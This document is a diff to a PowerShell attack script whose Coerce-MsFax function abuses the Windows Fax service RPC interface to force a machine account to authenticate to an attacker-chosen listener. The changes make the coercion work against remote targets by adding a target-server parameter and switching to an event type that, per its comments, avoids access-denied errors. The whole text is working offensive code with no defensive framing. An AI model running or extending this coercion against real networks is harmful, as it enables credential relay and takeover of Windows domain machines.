@@ -6,12 +6,13 @@ $client = Get-RpcClient $msfax
 
 function Coerce-MsFax {
     param(
+        [String] $TargetServer,
         [String] $ListeningServer,
         [String] $ListeningTcpPort
     )
 
     try {
-        $stringBinding = Get-RpcStringBinding -ProtocolSequence ncacn_np -Endpoint '\PIPE\SHAREDFAX'
+        $stringBinding = Get-RpcStringBinding -ProtocolSequence ncacn_np -NetworkAddress $TargetServer -Endpoint '\PIPE\SHAREDFAX'
         $securityQos = New-NtSecurityQualityOfService -ImpersonationLevel Identification
         Connect-RpcClient -Client $client -StringBinding $stringBinding  -AuthenticationLevel PacketPrivacy -SecurityQualityOfService $securityQos -AuthenticationType Default
     }
@@ -25,10 +26,13 @@ function Coerce-MsFax {
     if ($result.retval -eq 0) {
         $connection = $result.p2
 
-        $FAX_EVENT_TYPE_LEGACY = 0
-        $result = $client.FAX_StartServerNotificationEx($ListeningServer, $ListeningTcpPort, $context, 'ncan_ip_tcp', $false, $FAX_EVENT_TYPE_LEGACY)
+        # Access will be denied if the legacy event type is specified and the current RPC binding is a remote connection
+        # Access may also be denied for the new call, in queue, out queue, config, device status, activity, in archive, and out archive event types
+        # Access should be allowed for the queue state and fxssvc ended event types
+        $FAX_EVENT_TYPE_FXSSVC_ENDED = 0x00000080
+        $result = $client.FAX_StartServerNotificationEx($ListeningServer, $ListeningTcpPort, $context, 'ncan_ip_tcp', $true, $FAX_EVENT_TYPE_FXSSVC_ENDED)
         if ($result.retval -eq 0) {
-            Write-Host "[+] Machine account attempted authentication to $ListeningServer\:$ListeningTcpPort"
+            Write-Host "[+] Machine account attempted authentication to $ListeningServer $ListeningTcpPort"
             $result = $client.FAX_EndServerNotification($result.p6)
         }
         else {
